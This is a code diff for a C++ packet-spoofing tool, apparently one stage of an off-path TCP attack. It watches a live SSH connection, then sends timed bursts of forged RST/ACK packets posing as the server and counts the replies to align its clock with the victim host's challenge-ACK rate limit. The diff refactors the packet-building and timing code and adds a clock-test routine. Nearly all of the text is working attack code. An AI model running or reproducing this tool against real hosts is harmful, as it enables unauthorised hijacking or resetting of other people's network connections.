@@ -1,12 +1,12 @@
 #include <chrono>
 #include <iostream>
 #include <tins/tins.h>
+#include <thread>
 
 #include "common.h"
 #include "packet_counter.h"
 
 using namespace std;
-using namespace std::chrono;
 using namespace std::chrono_literals;
 
 // Inital number of legit SSH packets to trigger sniffer
@@ -17,7 +17,7 @@ void printHeader(const std::string msg) {
     for (auto i = 0u; i < msg.size() + 4; i++) {
         cout << "=";
     }
-    cout << endl << msg << endl;
+    cout << endl << "  " << msg << endl;
     for (auto i = 0u; i < msg.size() + 4; i++) {
         cout << "=";
     }
@@ -53,24 +53,17 @@ pair<ConnectionID, uint32_t> waitAndGetLegitConnectionInfo(
     return make_pair(connection, lastSeq);
 }
 
-int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
+milliseconds synchronizeClock(const ConnectionID& legitConn, int legitLastSeq) {
     Tins::PacketSender sender;
-    Tins::IP ipHeader = Tins::IP(legitConn.serverIP, legitConn.clientIP);
-    Tins::TCP tcpHeader = Tins::TCP(legitConn.serverPort, legitConn.clientPort);
-    tcpHeader.set_flag(Tins::TCP::Flags::RST, 1);
-    tcpHeader.set_flag(Tins::TCP::Flags::ACK, 1);
-    tcpHeader.seq(legitLastSeq + 3);
-    Tins::IP pkt = ipHeader / tcpHeader / Tins::RawPDU("C");
     
+    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3, "C");    
     auto pcounter = PacketCounter::instance();
 
     uint32_t n1, n2;
     {
         cout << "Sending out 200 packets in 1 sec..." << endl;
         pcounter->startCounting();
-        auto now = system_clock::now();
-        auto s = duration_cast<seconds>(now.time_since_epoch()) + 1000ms;
-        this_thread::sleep_until(system_clock::time_point(s));
+        auto s = align_and_delay(0ms);
         for (int i = 0; i < 200; i++) {
             sender.send(pkt);
             s += 5ms;
@@ -84,9 +77,7 @@ int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
     {
         cout << "Sending out 200 packets in 1 sec and 5ms delay..." << endl;
         pcounter->startCounting();
-        auto now = system_clock::now();
-        auto s = duration_cast<seconds>(now.time_since_epoch()) + 1005ms;
-        this_thread::sleep_until(system_clock::time_point(s));
+        auto s = align_and_delay(5ms);
         for (int i = 0; i < 200; i++) {
             sender.send(pkt);
             s += 5ms;
@@ -107,7 +98,28 @@ int synchronizeClock(ConnectionID legitConn, int legitLastSeq) {
     } else {
         delay_ms = 5 + (300 - n2) * 1000 / 200;
     }
-    return delay_ms;
+    return milliseconds(delay_ms);
+}
+
+void testClock(const ConnectionID& legitConn, int legitLastSeq, milliseconds delayMs) {
+    auto pcounter = PacketCounter::instance();
+    Tins::PacketSender sender;
+    auto pkt = make_packet(legitConn, "RA", legitLastSeq + 3, "C");    
+    for (int c = 0; c < 5; c++) {
+        pcounter->startCounting();
+        auto s = align_and_delay(delayMs);
+        int packets = 200;
+        for (int i = 0; i < packets; i++) {
+            sender.send(pkt);
+            s += 5ms;
+            this_thread::sleep_until(system_clock::time_point(s));
+        }
+        this_thread::sleep_for(3s);
+
+        auto result = pcounter->stopCounting();
+        cout << "Delay until: " << s.count() << "ms. ";
+        cout << " Sent: " << packets << " packets. Received: " << result << " packets" << endl;
+    }
 }
 
 int main() {
@@ -118,20 +130,6 @@ int main() {
     cout << "Got legit connection info: " << legitConn.toString() << " " << legitLastSeq << endl;
 
     printHeader("SYNCHRONIZING CLOCK...");
-
-    // for (int c = 0; c < 5; c++) {
-    //     pcounter.startCounting();
-    //     auto now = system_clock::now();
-    //     auto s = duration_cast<seconds>(now.time_since_epoch()) + 1000ms + milliseconds(delay_ms);
-    //     this_thread::sleep_until(system_clock::time_point(s));
-    //     int packets = 33000;
-    //     for (int i = 0; i < packets; i++) {
-    //         sender.send(pkt);
-    //     }
-    //     this_thread::sleep_for(3s);
-
-    //     auto result = pcounter.stopCounting();
-    //     cout << "Delay until: " << s.count() << "ms. ";
-    //     cout << " Sent: " << packets << " packets. Received: " << result << " packets" << endl;
-    // }
+    auto delayMs = synchronizeClock(legitConn, legitLastSeq);
+    cout << "Delay: " << delayMs.count() << "ms" << endl;
 }
